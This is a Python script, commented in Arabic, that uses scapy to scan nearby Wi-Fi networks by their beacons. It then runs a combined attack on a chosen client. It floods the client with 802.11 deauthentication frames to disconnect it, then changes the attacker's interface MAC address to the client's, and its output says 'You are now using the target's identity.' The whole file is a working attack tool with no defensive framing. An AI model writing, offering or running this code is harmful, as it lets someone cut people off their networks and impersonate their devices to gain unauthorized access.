import subprocess
from colorama import Fore, Style
from scapy.all import *

networks = {}

def packet_handler(pkt):
    """معالجة الحزم المكتشفة لبناء قائمة الشبكات"""
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        try:
            ssid = pkt[Dot11Elt].info.decode()
        except:
            ssid = "Hidden SSID"
        
        if bssid not in networks:
            try:
                channel = int(ord(pkt[Dot11Elt:3].info))
            except:
                channel = 0
            networks[bssid] = (ssid, channel)
            print(f"{Fore.WHITE}[{len(networks):<2}] SSID: {ssid:20} | BSSID: {bssid} | CH: {channel}")

def scan_wifi(interface):
    """بدء عملية مسح الشبكات"""
    print(f"{Fore.YELLOW}[*] Scanning... (Press Ctrl+C when you see your target network)")
    print(f"{'No':<3} {'SSID':<21} {'BSSID':<18} {'CH'}")
    print("-" * 65)
    try:
        sniff(iface=interface, prn=packet_handler, timeout=30)
    except KeyboardInterrupt:
        print(f"\n{Fore.BLUE}[*] Scan stopped by user.")
    return networks

def deauth_and_spoof(interface, target_bssid, client_mac):
    """تنفيذ الهجوم المزدوج: قطع الاتصال وانتحال الماك"""
    print(f"\n{Fore.RED}[!] ATTACK STARTED: Sending Deauth packets to {client_mac}...")
    
    # بناء حزمة Deauthentication
    packet = RadioTap()/Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=7)
    
    # إرسال الحزم لفصل الضحية
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)
    print(f"{Fore.GREEN}[+] Target disconnected.")

    # تغيير الماك أدريس الخاص بالمهاجم
    print(f"{Fore.BLUE}[*] Spoofing MAC address to {client_mac}...")
    subprocess.call(["sudo", "ifconfig", interface, "down"])
    subprocess.call(["sudo", "ifconfig", interface, "hw", "ether", client_mac])
    subprocess.call(["sudo", "ifconfig", interface, "up"])
    print(f"{Fore.GREEN}[+!!] Success! You are now using the target's identity.")